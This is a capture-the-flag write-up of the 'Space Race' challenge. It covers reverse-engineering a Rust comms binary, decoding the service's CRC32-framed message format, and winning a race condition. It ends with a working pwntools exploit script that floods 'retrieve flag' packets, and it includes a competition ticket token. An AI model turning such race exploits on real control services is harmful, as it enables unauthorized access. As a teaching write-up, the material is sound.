# Challenge Overview
The Space Race challenge required finding a flaw in the flight control software that communicated with the a comms service binary provided only the comms service binary. The binary provided was a 2MB+ stripped ELF64 file.

# Analysis
Strings in the provided binary made it clear that the binary was written in rust. As such, it was unlikely that the flaw was a memory corruption, and given the name of the program, we guessed that a race condition of some sort was the goal. This binary is large so we started with looking at where data is processed from "recv" functions along with strings.

## Static Analysis
Strings are not null terminated in the rust binary making, instead stored as a count and pointer, with the strings occuring one after another making it harder to analyze the individual ones. Looking for flag showed several strings related to a flag process, showing that there are options to start, stop, and request the flag from the flag process. Further the start and stop required an authorization key. Tracing what the value was for the authorization appeared to show that it came from a configuration file, so we could not grab it from the binary.

We created structures in IDA Pro to be able to follow buffers and strings in the rust program, as we were not terribly famililar with the rust API that would be represented by the compiled code. We also looked at the places where recv was called to see how our data was processed. One of the location added to a buffer and was located close the same function that appeared to parse and use the data before accessing the flag process. Tracing functions and the use of the recv'ed buffer showed two helpful points:
1. The data was immediately passed into a CRC32 function that checked the data against the last four bytes of the message
2. One built a message four output that did a lot of bit twiddling. We decided to use this information to attempt to parse the messages received from the service.

The data received was processed and compared to various task ids to determine if it was flag task, TLM taks, housekeeping task, etc. We did not get as far as determining the IDs, theorizing that they were pulled from the config file.

## Dynamic Analysis
We wrote a script to connect to the service and attempt to parse the received data based on the bit twiddling we saw in the binary. We were then able parse the six byte header consisting of a message type, some sequence number, length of payload minus 3, flags, followed by the payload and finally the CRC32. We were confident we were able to do this correctly once the CRC32 and length matched up. This showed that without interaction there were 3 messages message types received:
1. Type 0x6e was received the most, consisting of 50 bytes of binary data we never bothered with decoding
2. Type 0x6a provided a memory and disk usage report in JSON format
3. Type 0x64 was received once and reported FLAG APP FINE

We then attempted to determine the task id we needed to send for a flag task. We started by sending a payload of several \x01 values and using all possible values for the task ID to see if we could get a response, but nothing different was received. After several hours of trying to determine what was wrong (we never bothered actually running the service locally due to needing to determine the config.toml format), we realized a typo in the script was stripping off our header and thus all the CRC32 values were wrong resulting in our message being thrown out. We fixed the issue.... and still had the same problem. After staring at the code for another hour we realized that our length value was wrong as we had included the CRC32 in it and it should not be included. 

Throwing our script again resulted in the type 0x64 returning the string "NOT AUTHORIZED". We remembered seeing this in the binary, and determined that sending a payload with a value of '\x2' would request the flag instead of trying to start/stop the flag service. Updating the script to send this resulted in "FLAG SERVICE NOT AVAILABLE" so we figured we were on the correct path.

Running a couple of times showed that "FLAG APP FINE" message always occurred after the 5th time the 0x6a message was received (sequence number 4). We figured we would try to send the `Retrieve Flag` request at that point, and send a lot of them to try to win a potential race. To our great surprise, this worked the first time! One of the responses received after all of the requests contained the flag, indicating that we successfully sent the request while the service was polling the flag service, winning the race.

## Lessons Learned
We put off running the service locally due to needing
1. A valid configuration file
2. A flag service running separately

but in retrospect this probably would have saved time in debugging our solution.

# Final Solution
```python
from pwn import *
import zlib
import binascii


def send_data(c, typeCode, seq, flags, payload):
    bits1_3 = (typeCode >> 8) & 0x3
    bit4 = (flags >> 16) & 0x8
    bit5 = (flags >> 8) & 0x10
    bits6_8 = (flags & 7) << 5
    bits17_22 = (seq >> 8) & 0x3f
    bits23_24 = (flags >> 18)
    hdr = p8(bits1_3 | bit4 | bit5 | bits6_8) + p8(typeCode & 0xff) + p8(bits23_24 | bits17_22) + p8(seq & 0xff)

    # print 'Encoded %x %x %x as %s' % (typeCode, seq, flags, binascii.hexlify(hdr))
    data = hdr + p16(len(payload) + 3, endian='big') + payload
    msg = data + p32(zlib.crc32(data), endian='big', sign='signed')
    
    c.send(msg)

def read_entry(c):
    header = c.recv(6)
    size = u16(header[4:], endian='big') - 3
    bits = u8(header[0])
    first_bits = bits&3
    bit4 = bits&8
    bit5 = bits&0x10
    bits6_8 = (bits&0xe0) >> 5
    bits9_16 = u8(header[1])
    bits17_22 = u8(header[2]) & 0x3f
    bits23_24 = u8(header[2]) >> 6
    bits25_32 = u8(header[3])
    typeId = bits9_16 | (first_bits << 8)
    seqno = bits25_32 | (bits17_22 << 8)
    flags = bits6_8 | (bit5 << 8) | (bit4 << 16) | (bits23_24 << 24)

    print ('Decoded header %x %x %x from %s' % (typeId, seqno, flags, binascii.hexlify(header[:4])))

    print ("Decoded size 0x%x" % (size))

    payload = c.recv(size)
    print 'Payload:'
    print repr(payload)
    #print binascii.hexlify(payload)
    crc32 = c.recv(4)
    calculated = zlib.crc32(header + payload)
    received = u32(crc32, endian='big', sign='signed')
    return (calculated == received, payload, typeId, seqno, flags)

conn = remote('spacerace.satellitesabove.me', 5063)
print conn.recvline()
conn.sendline('ticket{bravo70356whiskey:GFmffmBdjY7l-HU1vYmZ9r0ndaao8K7omtj58JfSg4hmCjKRcZweU69LQA5tKbrCWQ}')
real = conn.recvline()
conn.close()

c2 = remote(real[13:].split(':')[0], int(real.split(':')[1]))

print "Connected to service"


for test in range(100):
  status, payload, typeId, seqno, flags = read_entry(c2)
  # Service should be up after this...
  if seqno == 4 and typeId == 0x6a:
  #    print 'Sending test'

    # 64 is the flag related stuff...
    # I believe payload 0 = start, 1 = stop, 2 = retrieve
    
    # Spam it hard
    for i in range(1000):
      send_data(c2, 0x64, 0, 0x3000000, '\x02'*10)



c2.close()
```
